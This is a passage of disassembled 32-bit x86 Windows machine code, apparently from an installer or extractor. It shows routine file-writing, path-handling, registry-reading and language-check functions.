  406372:	33 cd                	xor    %ebp,%ecx
  406374:	5b                   	pop    %ebx
  406375:	e8 66 09 00 00       	call   0x406ce0
  40637a:	8b e5                	mov    %ebp,%esp
  40637c:	5d                   	pop    %ebp
  40637d:	c3                   	ret
  40637e:	cc                   	int3
  40637f:	cc                   	int3
  406380:	8b ff                	mov    %edi,%edi
  406382:	55                   	push   %ebp
  406383:	8b ec                	mov    %esp,%ebp
  406385:	56                   	push   %esi
  406386:	be 00 02 00 00       	mov    $0x200,%esi
  40638b:	33 c9                	xor    %ecx,%ecx
  40638d:	8b 45 08             	mov    0x8(%ebp),%eax
  406390:	33 d2                	xor    %edx,%edx
  406392:	f7 f6                	div    %esi
  406394:	8b c2                	mov    %edx,%eax
  406396:	f7 d8                	neg    %eax
  406398:	1b c0                	sbb    %eax,%eax
  40639a:	23 c6                	and    %esi,%eax
  40639c:	03 f6                	add    %esi,%esi
  40639e:	2b c2                	sub    %edx,%eax
  4063a0:	03 45 08             	add    0x8(%ebp),%eax
  4063a3:	01 81 e0 89 40 00    	add    %eax,0x4089e0(%ecx)
  4063a9:	83 c1 04             	add    $0x4,%ecx
  4063ac:	83 f9 20             	cmp    $0x20,%ecx
  4063af:	72 dc                	jb     0x40638d
  4063b1:	33 c0                	xor    %eax,%eax
  4063b3:	40                   	inc    %eax
  4063b4:	5e                   	pop    %esi
  4063b5:	5d                   	pop    %ebp
  4063b6:	c2 10 00             	ret    $0x10
  4063b9:	cc                   	int3
  4063ba:	cc                   	int3
  4063bb:	cc                   	int3
  4063bc:	cc                   	int3
  4063bd:	cc                   	int3
  4063be:	cc                   	int3
  4063bf:	cc                   	int3
  4063c0:	8b ff                	mov    %edi,%edi
  4063c2:	55                   	push   %ebp
  4063c3:	8b ec                	mov    %esp,%ebp
  4063c5:	81 ec 10 01 00 00    	sub    $0x110,%esp
  4063cb:	a1 04 80 40 00       	mov    0x408004,%eax
  4063d0:	33 c5                	xor    %ebp,%eax
  4063d2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4063d5:	8b 45 14             	mov    0x14(%ebp),%eax
  4063d8:	83 a5 f4 fe ff ff 00 	andl   $0x0,-0x10c(%ebp)
  4063df:	53                   	push   %ebx
  4063e0:	56                   	push   %esi
  4063e1:	8b 75 10             	mov    0x10(%ebp),%esi
  4063e4:	bb 04 01 00 00       	mov    $0x104,%ebx
  4063e9:	57                   	push   %edi
  4063ea:	51                   	push   %ecx
  4063eb:	68 e4 91 40 00       	push   $0x4091e4
  4063f0:	51                   	push   %ecx
  4063f1:	33 ff                	xor    %edi,%edi
  4063f3:	89 85 f0 fe ff ff    	mov    %eax,-0x110(%ebp)
  4063f9:	8b d3                	mov    %ebx,%edx
  4063fb:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  406401:	47                   	inc    %edi
  406402:	e8 7a b3 ff ff       	call   0x401781
  406407:	56                   	push   %esi
  406408:	8b d3                	mov    %ebx,%edx
  40640a:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  406410:	e8 75 01 00 00       	call   0x40658a
  406415:	33 db                	xor    %ebx,%ebx
  406417:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  40641d:	53                   	push   %ebx
  40641e:	68 80 00 00 00       	push   $0x80
  406423:	6a 02                	push   $0x2
  406425:	53                   	push   %ebx
  406426:	53                   	push   %ebx
  406427:	68 00 00 00 40       	push   $0x40000000
  40642c:	50                   	push   %eax
  40642d:	ff 15 08 a1 40 00    	call   *0x40a108
  406433:	8b f0                	mov    %eax,%esi
  406435:	83 fe ff             	cmp    $0xffffffff,%esi
  406438:	75 0e                	jne    0x406448
  40643a:	c7 05 24 91 40 00 52 	movl   $0x80070052,0x409124
  406441:	00 07 80 
  406444:	8b fb                	mov    %ebx,%edi
  406446:	eb 38                	jmp    0x406480
  406448:	53                   	push   %ebx
  406449:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40644c:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  406452:	50                   	push   %eax
  406453:	53                   	push   %ebx
  406454:	ff b5 f0 fe ff ff    	push   -0x110(%ebp)
  40645a:	56                   	push   %esi
  40645b:	ff 15 cc a0 40 00    	call   *0x40a0cc
  406461:	85 c0                	test   %eax,%eax
  406463:	74 08                	je     0x40646d
  406465:	3b 9d f4 fe ff ff    	cmp    -0x10c(%ebp),%ebx
  40646b:	74 0c                	je     0x406479
  40646d:	c7 05 24 91 40 00 52 	movl   $0x80070052,0x409124
  406474:	00 07 80 
  406477:	33 ff                	xor    %edi,%edi
  406479:	56                   	push   %esi
  40647a:	ff 15 88 a0 40 00    	call   *0x40a088
  406480:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406483:	8b c7                	mov    %edi,%eax
  406485:	5f                   	pop    %edi
  406486:	5e                   	pop    %esi
  406487:	33 cd                	xor    %ebp,%ecx
  406489:	5b                   	pop    %ebx
  40648a:	e8 51 08 00 00       	call   0x406ce0
  40648f:	8b e5                	mov    %ebp,%esp
  406491:	5d                   	pop    %ebp
  406492:	c2 10 00             	ret    $0x10
  406495:	8b ff                	mov    %edi,%edi
  406497:	55                   	push   %ebp
  406498:	8b ec                	mov    %esp,%ebp
  40649a:	81 ec 08 01 00 00    	sub    $0x108,%esp
  4064a0:	a1 04 80 40 00       	mov    0x408004,%eax
  4064a5:	33 c5                	xor    %ebp,%eax
  4064a7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4064aa:	57                   	push   %edi
  4064ab:	51                   	push   %ecx
  4064ac:	68 e4 91 40 00       	push   $0x4091e4
  4064b1:	51                   	push   %ecx
  4064b2:	ba 04 01 00 00       	mov    $0x104,%edx
  4064b7:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  4064bd:	e8 bf b2 ff ff       	call   0x401781
  4064c2:	bf d8 11 40 00       	mov    $0x4011d8,%edi
  4064c7:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  4064cd:	57                   	push   %edi
  4064ce:	ba 04 01 00 00       	mov    $0x104,%edx
  4064d3:	e8 b2 00 00 00       	call   0x40658a
  4064d8:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4064de:	50                   	push   %eax
  4064df:	ff 15 70 a0 40 00    	call   *0x40a070
  4064e5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4064e8:	74 17                	je     0x406501
  4064ea:	a8 10                	test   $0x10,%al
  4064ec:	75 13                	jne    0x406501
  4064ee:	6a 08                	push   $0x8
  4064f0:	6a 00                	push   $0x0
  4064f2:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4064f8:	50                   	push   %eax
  4064f9:	ff 15 a0 a1 40 00    	call   *0x40a1a0
  4064ff:	eb 07                	jmp    0x406508
  406501:	57                   	push   %edi
  406502:	ff 15 78 a0 40 00    	call   *0x40a078
  406508:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40650b:	33 cd                	xor    %ebp,%ecx
  40650d:	5f                   	pop    %edi
  40650e:	e8 cd 07 00 00       	call   0x406ce0
  406513:	8b e5                	mov    %ebp,%esp
  406515:	5d                   	pop    %ebp
  406516:	c3                   	ret
  406517:	8b ff                	mov    %edi,%edi
  406519:	55                   	push   %ebp
  40651a:	8b ec                	mov    %esp,%ebp
  40651c:	51                   	push   %ecx
  40651d:	53                   	push   %ebx
  40651e:	56                   	push   %esi
  40651f:	8b 35 3c 9a 40 00    	mov    0x409a3c,%esi
  406525:	57                   	push   %edi
  406526:	6a 05                	push   $0x5
  406528:	52                   	push   %edx
  406529:	56                   	push   %esi
  40652a:	ff 15 e0 a0 40 00    	call   *0x40a0e0
  406530:	33 db                	xor    %ebx,%ebx
  406532:	85 c0                	test   %eax,%eax
  406534:	74 35                	je     0x40656b
  406536:	50                   	push   %eax
  406537:	56                   	push   %esi
  406538:	ff 15 28 a1 40 00    	call   *0x40a128
  40653e:	8b f8                	mov    %eax,%edi
  406540:	85 ff                	test   %edi,%edi
  406542:	74 27                	je     0x40656b
  406544:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  406547:	75 03                	jne    0x40654c
  406549:	53                   	push   %ebx
  40654a:	eb 03                	jmp    0x40654f
  40654c:	ff 75 10             	push   0x10(%ebp)
  40654f:	ff 75 0c             	push   0xc(%ebp)
  406552:	ff 75 08             	push   0x8(%ebp)
  406555:	57                   	push   %edi
  406556:	56                   	push   %esi
  406557:	ff 15 b0 a1 40 00    	call   *0x40a1b0
  40655d:	57                   	push   %edi
  40655e:	8b f0                	mov    %eax,%esi
  406560:	ff 15 f4 a0 40 00    	call   *0x40a0f4
  406566:	83 fe ff             	cmp    $0xffffffff,%esi
  406569:	75 14                	jne    0x40657f
  40656b:	53                   	push   %ebx
  40656c:	6a 10                	push   $0x10
  40656e:	53                   	push   %ebx
  40656f:	53                   	push   %ebx
  406570:	ba fb 04 00 00       	mov    $0x4fb,%edx
  406575:	33 c9                	xor    %ecx,%ecx
  406577:	e8 3d df ff ff       	call   0x4044b9
  40657c:	8b 75 14             	mov    0x14(%ebp),%esi
  40657f:	5f                   	pop    %edi
  406580:	8b c6                	mov    %esi,%eax
  406582:	5e                   	pop    %esi
  406583:	5b                   	pop    %ebx
  406584:	8b e5                	mov    %ebp,%esp
  406586:	5d                   	pop    %ebp
  406587:	c2 10 00             	ret    $0x10
  40658a:	8b ff                	mov    %edi,%edi
  40658c:	55                   	push   %ebp
  40658d:	8b ec                	mov    %esp,%ebp
  40658f:	53                   	push   %ebx
  406590:	56                   	push   %esi
  406591:	57                   	push   %edi
  406592:	8b f9                	mov    %ecx,%edi
  406594:	8b da                	mov    %edx,%ebx
  406596:	8b f7                	mov    %edi,%esi
  406598:	8d 4e 01             	lea    0x1(%esi),%ecx
  40659b:	8a 06                	mov    (%esi),%al
  40659d:	46                   	inc    %esi
  40659e:	84 c0                	test   %al,%al
  4065a0:	75 f9                	jne    0x40659b
  4065a2:	2b f1                	sub    %ecx,%esi
  4065a4:	8d 46 01             	lea    0x1(%esi),%eax
  4065a7:	3b c3                	cmp    %ebx,%eax
  4065a9:	72 07                	jb     0x4065b2
  4065ab:	b8 7a 00 07 80       	mov    $0x8007007a,%eax
  4065b0:	eb 2f                	jmp    0x4065e1
  4065b2:	03 f7                	add    %edi,%esi
  4065b4:	3b f7                	cmp    %edi,%esi
  4065b6:	76 11                	jbe    0x4065c9
  4065b8:	56                   	push   %esi
  4065b9:	57                   	push   %edi
  4065ba:	ff 15 e4 a1 40 00    	call   *0x40a1e4
  4065c0:	80 38 5c             	cmpb   $0x5c,(%eax)
  4065c3:	74 04                	je     0x4065c9
  4065c5:	c6 06 5c             	movb   $0x5c,(%esi)
  4065c8:	46                   	inc    %esi
  4065c9:	8b 45 08             	mov    0x8(%ebp),%eax
  4065cc:	c6 06 00             	movb   $0x0,(%esi)
  4065cf:	eb 01                	jmp    0x4065d2
  4065d1:	40                   	inc    %eax
  4065d2:	80 38 20             	cmpb   $0x20,(%eax)
  4065d5:	74 fa                	je     0x4065d1
  4065d7:	50                   	push   %eax
  4065d8:	8b d3                	mov    %ebx,%edx
  4065da:	8b cf                	mov    %edi,%ecx
  4065dc:	e8 d2 b0 ff ff       	call   0x4016b3
  4065e1:	5f                   	pop    %edi
  4065e2:	5e                   	pop    %esi
  4065e3:	5b                   	pop    %ebx
  4065e4:	5d                   	pop    %ebp
  4065e5:	c2 04 00             	ret    $0x4
  4065e8:	8b ff                	mov    %edi,%edi
  4065ea:	53                   	push   %ebx
  4065eb:	56                   	push   %esi
  4065ec:	57                   	push   %edi
  4065ed:	8b f9                	mov    %ecx,%edi
  4065ef:	8d 51 01             	lea    0x1(%ecx),%edx
  4065f2:	33 db                	xor    %ebx,%ebx
  4065f4:	8a 01                	mov    (%ecx),%al
  4065f6:	41                   	inc    %ecx
  4065f7:	84 c0                	test   %al,%al
  4065f9:	75 f9                	jne    0x4065f4
  4065fb:	2b ca                	sub    %edx,%ecx
  4065fd:	8d 04 39             	lea    (%ecx,%edi,1),%eax
  406600:	50                   	push   %eax
  406601:	57                   	push   %edi
  406602:	ff 15 e4 a1 40 00    	call   *0x40a1e4
  406608:	50                   	push   %eax
  406609:	eb 06                	jmp    0x406611
  40660b:	80 3e 5c             	cmpb   $0x5c,(%esi)
  40660e:	74 13                	je     0x406623
  406610:	56                   	push   %esi
  406611:	57                   	push   %edi
  406612:	ff 15 e4 a1 40 00    	call   *0x40a1e4
  406618:	8b f0                	mov    %eax,%esi
  40661a:	3b f7                	cmp    %edi,%esi
  40661c:	77 ed                	ja     0x40660b
  40661e:	80 3e 5c             	cmpb   $0x5c,(%esi)
  406621:	75 1f                	jne    0x406642
  406623:	3b f7                	cmp    %edi,%esi
  406625:	74 0d                	je     0x406634
  406627:	56                   	push   %esi
  406628:	57                   	push   %edi
  406629:	ff 15 e4 a1 40 00    	call   *0x40a1e4
  40662f:	80 38 3a             	cmpb   $0x3a,(%eax)
  406632:	75 09                	jne    0x40663d
  406634:	56                   	push   %esi
  406635:	ff 15 ec a1 40 00    	call   *0x40a1ec
  40663b:	8b f0                	mov    %eax,%esi
  40663d:	88 1e                	mov    %bl,(%esi)
  40663f:	33 db                	xor    %ebx,%ebx
  406641:	43                   	inc    %ebx
  406642:	5f                   	pop    %edi
  406643:	5e                   	pop    %esi
  406644:	8b c3                	mov    %ebx,%eax
  406646:	5b                   	pop    %ebx
  406647:	c3                   	ret
  406648:	8b ff                	mov    %edi,%edi
  40664a:	55                   	push   %ebp
  40664b:	8b ec                	mov    %esp,%ebp
  40664d:	51                   	push   %ecx
  40664e:	53                   	push   %ebx
  40664f:	66 8b c1             	mov    %cx,%ax
  406652:	66 8b da             	mov    %dx,%bx
  406655:	66 89 45 fe          	mov    %ax,-0x2(%ebp)
  406659:	3a c3                	cmp    %bl,%al
  40665b:	75 1a                	jne    0x406677
  40665d:	50                   	push   %eax
  40665e:	ff 15 90 a0 40 00    	call   *0x40a090
  406664:	85 c0                	test   %eax,%eax
  406666:	74 0b                	je     0x406673
  406668:	33 c0                	xor    %eax,%eax
  40666a:	66 39 5d fe          	cmp    %bx,-0x2(%ebp)
  40666e:	0f 95 c0             	setne  %al
  406671:	eb 07                	jmp    0x40667a
  406673:	33 c0                	xor    %eax,%eax
  406675:	eb 03                	jmp    0x40667a
  406677:	33 c0                	xor    %eax,%eax
  406679:	40                   	inc    %eax
  40667a:	5b                   	pop    %ebx
  40667b:	8b e5                	mov    %ebp,%esp
  40667d:	5d                   	pop    %ebp
  40667e:	c3                   	ret
  40667f:	8b ff                	mov    %edi,%edi
  406681:	56                   	push   %esi
  406682:	57                   	push   %edi
  406683:	8b fa                	mov    %edx,%edi
  406685:	8b f1                	mov    %ecx,%esi
  406687:	eb 17                	jmp    0x4066a0
  406689:	66 8b 0e             	mov    (%esi),%cx
  40668c:	8b d7                	mov    %edi,%edx
  40668e:	e8 b5 ff ff ff       	call   0x406648
  406693:	85 c0                	test   %eax,%eax
  406695:	74 13                	je     0x4066aa
  406697:	56                   	push   %esi
  406698:	ff 15 ec a1 40 00    	call   *0x40a1ec
  40669e:	8b f0                	mov    %eax,%esi
  4066a0:	80 3e 00             	cmpb   $0x0,(%esi)
  4066a3:	75 e4                	jne    0x406689
  4066a5:	33 c0                	xor    %eax,%eax
  4066a7:	5f                   	pop    %edi
  4066a8:	5e                   	pop    %esi
  4066a9:	c3                   	ret
  4066aa:	8b c6                	mov    %esi,%eax
  4066ac:	eb f9                	jmp    0x4066a7
  4066ae:	8b ff                	mov    %edi,%edi
  4066b0:	51                   	push   %ecx
  4066b1:	ff 15 70 a0 40 00    	call   *0x40a070
  4066b7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4066ba:	75 03                	jne    0x4066bf
  4066bc:	33 c0                	xor    %eax,%eax
  4066be:	c3                   	ret
  4066bf:	c1 e8 04             	shr    $0x4,%eax
  4066c2:	f7 d0                	not    %eax
  4066c4:	83 e0 01             	and    $0x1,%eax
  4066c7:	c3                   	ret
  4066c8:	8b ff                	mov    %edi,%edi
  4066ca:	53                   	push   %ebx
  4066cb:	56                   	push   %esi
  4066cc:	57                   	push   %edi
  4066cd:	8b da                	mov    %edx,%ebx
  4066cf:	8b f1                	mov    %ecx,%esi
  4066d1:	33 ff                	xor    %edi,%edi
  4066d3:	eb 19                	jmp    0x4066ee
  4066d5:	66 8b 0e             	mov    (%esi),%cx
  4066d8:	8b d3                	mov    %ebx,%edx
  4066da:	e8 69 ff ff ff       	call   0x406648
  4066df:	85 c0                	test   %eax,%eax
  4066e1:	75 02                	jne    0x4066e5
  4066e3:	8b fe                	mov    %esi,%edi
  4066e5:	56                   	push   %esi
  4066e6:	ff 15 ec a1 40 00    	call   *0x40a1ec
  4066ec:	8b f0                	mov    %eax,%esi
  4066ee:	80 3e 00             	cmpb   $0x0,(%esi)
  4066f1:	75 e2                	jne    0x4066d5
  4066f3:	8b c7                	mov    %edi,%eax
  4066f5:	5f                   	pop    %edi
  4066f6:	5e                   	pop    %esi
  4066f7:	5b                   	pop    %ebx
  4066f8:	c3                   	ret
  4066f9:	8b ff                	mov    %edi,%edi
  4066fb:	55                   	push   %ebp
  4066fc:	8b ec                	mov    %esp,%ebp
  4066fe:	51                   	push   %ecx
  4066ff:	51                   	push   %ecx
  406700:	53                   	push   %ebx
  406701:	56                   	push   %esi
  406702:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406705:	33 f6                	xor    %esi,%esi
  406707:	8b d1                	mov    %ecx,%edx
  406709:	57                   	push   %edi
  40670a:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40670d:	8b fa                	mov    %edx,%edi
  40670f:	8a 1f                	mov    (%edi),%bl
  406711:	8d 43 d0             	lea    -0x30(%ebx),%eax
  406714:	3c 09                	cmp    $0x9,%al
  406716:	77 0d                	ja     0x406725
  406718:	83 c6 fd             	add    $0xfffffffd,%esi
  40671b:	0f be c3             	movsbl %bl,%eax
  40671e:	c1 e6 04             	shl    $0x4,%esi
  406721:	03 f0                	add    %eax,%esi
  406723:	eb 1b                	jmp    0x406740
  406725:	80 fb 61             	cmp    $0x61,%bl
  406728:	7c 03                	jl     0x40672d
  40672a:	80 c3 e0             	add    $0xe0,%bl
  40672d:	0f be cb             	movsbl %bl,%ecx
  406730:	8d 41 bf             	lea    -0x41(%ecx),%eax
  406733:	83 f8 05             	cmp    $0x5,%eax
  406736:	77 13                	ja     0x40674b
  406738:	c1 e6 04             	shl    $0x4,%esi
  40673b:	83 c6 c9             	add    $0xffffffc9,%esi
  40673e:	03 f1                	add    %ecx,%esi
  406740:	57                   	push   %edi
  406741:	ff 15 ec a1 40 00    	call   *0x40a1ec
  406747:	8b f8                	mov    %eax,%edi
  406749:	eb c4                	jmp    0x40670f
  40674b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40674e:	89 30                	mov    %esi,(%eax)
  406750:	33 c0                	xor    %eax,%eax
  406752:	3b 7d f8             	cmp    -0x8(%ebp),%edi
  406755:	5f                   	pop    %edi
  406756:	5e                   	pop    %esi
  406757:	0f 95 c0             	setne  %al
  40675a:	5b                   	pop    %ebx
  40675b:	8b e5                	mov    %ebp,%esp
  40675d:	5d                   	pop    %ebp
  40675e:	c3                   	ret
  40675f:	cc                   	int3
  406760:	8b ff                	mov    %edi,%edi
  406762:	55                   	push   %ebp
  406763:	8b ec                	mov    %esp,%ebp
  406765:	8b 55 18             	mov    0x18(%ebp),%edx
  406768:	8b 45 0c             	mov    0xc(%ebp),%eax
  40676b:	56                   	push   %esi
  40676c:	33 f6                	xor    %esi,%esi
  40676e:	46                   	inc    %esi
  40676f:	3b 42 08             	cmp    0x8(%edx),%eax
  406772:	75 18                	jne    0x40678c
  406774:	8b 45 14             	mov    0x14(%ebp),%eax
  406777:	8b c8                	mov    %eax,%ecx
  406779:	81 e1 ff 03 00 00    	and    $0x3ff,%ecx
  40677f:	66 39 0a             	cmp    %cx,(%edx)
  406782:	75 08                	jne    0x40678c
  406784:	89 72 04             	mov    %esi,0x4(%edx)
  406787:	33 f6                	xor    %esi,%esi
  406789:	66 89 02             	mov    %ax,(%edx)
  40678c:	8b c6                	mov    %esi,%eax
  40678e:	5e                   	pop    %esi
  40678f:	5d                   	pop    %ebp
  406790:	c2 14 00             	ret    $0x14
  406793:	8b ff                	mov    %edi,%edi
  406795:	55                   	push   %ebp
  406796:	8b ec                	mov    %esp,%ebp
  406798:	83 ec 0c             	sub    $0xc,%esp
  40679b:	66 8b 45 0c          	mov    0xc(%ebp),%ax
  40679f:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4067a3:	6a 10                	push   $0x10
  4067a5:	5a                   	pop    %edx
  4067a6:	66 89 45 f4          	mov    %ax,-0xc(%ebp)
  4067aa:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4067ad:	50                   	push   %eax
  4067ae:	68 60 67 40 00       	push   $0x406760
  4067b3:	6a 01                	push   $0x1
  4067b5:	52                   	push   %edx
  4067b6:	51                   	push   %ecx
  4067b7:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4067ba:	ff 15 60 a1 40 00    	call   *0x40a160
  4067c0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4067c3:	8b e5                	mov    %ebp,%esp
  4067c5:	5d                   	pop    %ebp
  4067c6:	c2 08 00             	ret    $0x8
  4067c9:	8b ff                	mov    %edi,%edi
  4067cb:	55                   	push   %ebp
  4067cc:	8b ec                	mov    %esp,%ebp
  4067ce:	51                   	push   %ecx
  4067cf:	56                   	push   %esi
  4067d0:	8b 35 d4 81 40 00    	mov    0x4081d4,%esi
  4067d6:	57                   	push   %edi
  4067d7:	8b 3d 3c 9a 40 00    	mov    0x409a3c,%edi
  4067dd:	83 fe fe             	cmp    $0xfffffffe,%esi
  4067e0:	75 33                	jne    0x406815
  4067e2:	83 25 d4 81 40 00 00 	andl   $0x0,0x4081d4
  4067e9:	33 f6                	xor    %esi,%esi
  4067eb:	46                   	inc    %esi
  4067ec:	56                   	push   %esi
  4067ed:	51                   	push   %ecx
  4067ee:	8b cf                	mov    %edi,%ecx
  4067f0:	e8 9e ff ff ff       	call   0x406793
  4067f5:	85 c0                	test   %eax,%eax
  4067f7:	75 16                	jne    0x40680f
  4067f9:	6a 0d                	push   $0xd
  4067fb:	51                   	push   %ecx
  4067fc:	8b cf                	mov    %edi,%ecx
  4067fe:	e8 90 ff ff ff       	call   0x406793
  406803:	85 c0                	test   %eax,%eax
  406805:	75 08                	jne    0x40680f
  406807:	8b 35 d4 81 40 00    	mov    0x4081d4,%esi
  40680d:	eb 06                	jmp    0x406815
  40680f:	89 35 d4 81 40 00    	mov    %esi,0x4081d4
  406815:	5f                   	pop    %edi
  406816:	8b c6                	mov    %esi,%eax
  406818:	5e                   	pop    %esi
  406819:	8b e5                	mov    %ebp,%esp
  40681b:	5d                   	pop    %ebp
  40681c:	c2 04 00             	ret    $0x4
  40681f:	8b ff                	mov    %edi,%edi
  406821:	55                   	push   %ebp
  406822:	8b ec                	mov    %esp,%ebp
  406824:	81 ec b4 00 00 00    	sub    $0xb4,%esp
  40682a:	a1 04 80 40 00       	mov    0x408004,%eax
  40682f:	33 c5                	xor    %ebp,%eax
  406831:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406834:	56                   	push   %esi
  406835:	57                   	push   %edi
  406836:	8b 3d d8 81 40 00    	mov    0x4081d8,%edi
  40683c:	33 f6                	xor    %esi,%esi
  40683e:	c7 85 50 ff ff ff 0c 	movl   $0xc,-0xb0(%ebp)
  406845:	00 00 00 
  406848:	89 b5 54 ff ff ff    	mov    %esi,-0xac(%ebp)
  40684e:	83 ff fe             	cmp    $0xfffffffe,%edi
  406851:	0f 85 e9 00 00 00    	jne    0x406940
  406857:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  40685d:	89 35 d8 81 40 00    	mov    %esi,0x4081d8
  406863:	50                   	push   %eax
  406864:	c7 85 5c ff ff ff 94 	movl   $0x94,-0xa4(%ebp)
  40686b:	00 00 00 
  40686e:	ff 15 14 a1 40 00    	call   *0x40a114
  406874:	85 c0                	test   %eax,%eax
  406876:	0f 84 be 00 00 00    	je     0x40693a
  40687c:	33 ff                	xor    %edi,%edi
  40687e:	47                   	inc    %edi
  40687f:	39 bd 6c ff ff ff    	cmp    %edi,-0x94(%ebp)
  406885:	0f 85 af 00 00 00    	jne    0x40693a
  40688b:	83 bd 60 ff ff ff 04 	cmpl   $0x4,-0xa0(%ebp)
  406892:	0f 85 a2 00 00 00    	jne    0x40693a
  406898:	83 bd 64 ff ff ff 0a 	cmpl   $0xa,-0x9c(%ebp)
  40689f:	0f 83 95 00 00 00    	jae    0x40693a
  4068a5:	6a 4a                	push   $0x4a
  4068a7:	ff 15 1c a2 40 00    	call   *0x40a21c
  4068ad:	85 c0                	test   %eax,%eax
  4068af:	0f 84 85 00 00 00    	je     0x40693a
  4068b5:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  4068bb:	50                   	push   %eax
  4068bc:	68 19 00 02 00       	push   $0x20019
  4068c1:	56                   	push   %esi
  4068c2:	68 e0 13 40 00       	push   $0x4013e0
  4068c7:	68 01 00 00 80       	push   $0x80000001
  4068cc:	ff 15 08 a0 40 00    	call   *0x40a008
  4068d2:	85 c0                	test   %eax,%eax
  4068d4:	75 64                	jne    0x40693a
  4068d6:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
  4068dc:	50                   	push   %eax
  4068dd:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4068e0:	50                   	push   %eax
  4068e1:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  4068e7:	50                   	push   %eax
  4068e8:	56                   	push   %esi
  4068e9:	68 40 11 40 00       	push   $0x401140
  4068ee:	ff b5 58 ff ff ff    	push   -0xa8(%ebp)
  4068f4:	ff 15 28 a0 40 00    	call   *0x40a028
  4068fa:	ff b5 58 ff ff ff    	push   -0xa8(%ebp)
  406900:	8b f0                	mov    %eax,%esi
  406902:	ff 15 30 a0 40 00    	call   *0x40a030
  406908:	85 f6                	test   %esi,%esi
  40690a:	75 2e                	jne    0x40693a
  40690c:	8d 95 54 ff ff ff    	lea    -0xac(%ebp),%edx
  406912:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406915:	e8 df fd ff ff       	call   0x4066f9
  40691a:	85 c0                	test   %eax,%eax
  40691c:	74 1c                	je     0x40693a
  40691e:	8b 85 54 ff ff ff    	mov    -0xac(%ebp),%eax
  406924:	25 ff 03 00 00       	and    $0x3ff,%eax
  406929:	3b c7                	cmp    %edi,%eax
  40692b:	74 05                	je     0x406932
  40692d:	83 f8 0d             	cmp    $0xd,%eax
  406930:	75 08                	jne    0x40693a
  406932:	89 3d d8 81 40 00    	mov    %edi,0x4081d8
  406938:	eb 06                	jmp    0x406940
  40693a:	8b 3d d8 81 40 00    	mov    0x4081d8,%edi
  406940:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406943:	8b c7                	mov    %edi,%eax
  406945:	5f                   	pop    %edi
  406946:	33 cd                	xor    %ebp,%ecx
  406948:	5e                   	pop    %esi
  406949:	e8 92 03 00 00       	call   0x406ce0
  40694e:	8b e5                	mov    %ebp,%esp
  406950:	5d                   	pop    %ebp
  406951:	c3                   	ret
  406952:	8b ff                	mov    %edi,%edi
  406954:	55                   	push   %ebp
  406955:	8b ec                	mov    %esp,%ebp
  406957:	83 ec 10             	sub    $0x10,%esp
  40695a:	56                   	push   %esi
  40695b:	33 f6                	xor    %esi,%esi
  40695d:	80 39 00             	cmpb   $0x0,(%ecx)
  406960:	89 75 f8             	mov    %esi,-0x8(%ebp)
  406963:	89 75 fc             	mov    %esi,-0x4(%ebp)
  406966:	89 75 f0             	mov    %esi,-0x10(%ebp)
  406969:	89 75 f4             	mov    %esi,-0xc(%ebp)
  40696c:	74 33                	je     0x4069a1
  40696e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406971:	50                   	push   %eax
  406972:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406975:	50                   	push   %eax
  406976:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406979:	50                   	push   %eax
  40697a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40697d:	50                   	push   %eax
  40697e:	51                   	push   %ecx
  40697f:	ff 15 5c a1 40 00    	call   *0x40a15c
  406985:	85 c0                	test   %eax,%eax
  406987:	74 18                	je     0x4069a1
  406989:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40698c:	0f af 45 f8          	imul   -0x8(%ebp),%eax
  406990:	68 00 04 00 00       	push   $0x400
  406995:	ff 75 f4             	push   -0xc(%ebp)
  406998:	50                   	push   %eax
  406999:	ff 15 58 a1 40 00    	call   *0x40a158
  40699f:	8b f0                	mov    %eax,%esi
  4069a1:	8b c6                	mov    %esi,%eax
  4069a3:	5e                   	pop    %esi
  4069a4:	8b e5                	mov    %ebp,%esp
  4069a6:	5d                   	pop    %ebp
  4069a7:	c3                   	ret
  4069a8:	cc                   	int3
  4069a9:	cc                   	int3
  4069aa:	cc                   	int3
  4069ab:	cc                   	int3
  4069ac:	cc                   	int3
  4069ad:	cc                   	int3
  4069ae:	cc                   	int3
  4069af:	cc                   	int3
  4069b0:	e8 bb 02 00 00       	call   0x406c70
  4069b5:	6a 02                	push   $0x2
  4069b7:	a3 f8 81 40 00       	mov    %eax,0x4081f8
  4069bc:	e8 fd 05 00 00       	call   0x406fbe
  4069c1:	50                   	push   %eax
  4069c2:	ff 15 64 a2 40 00    	call   *0x40a264
  4069c8:	83 0d a4 88 40 00 ff 	orl    $0xffffffff,0x4088a4
  4069cf:	83 0d a8 88 40 00 ff 	orl    $0xffffffff,0x4088a8
  4069d6:	59                   	pop    %ecx
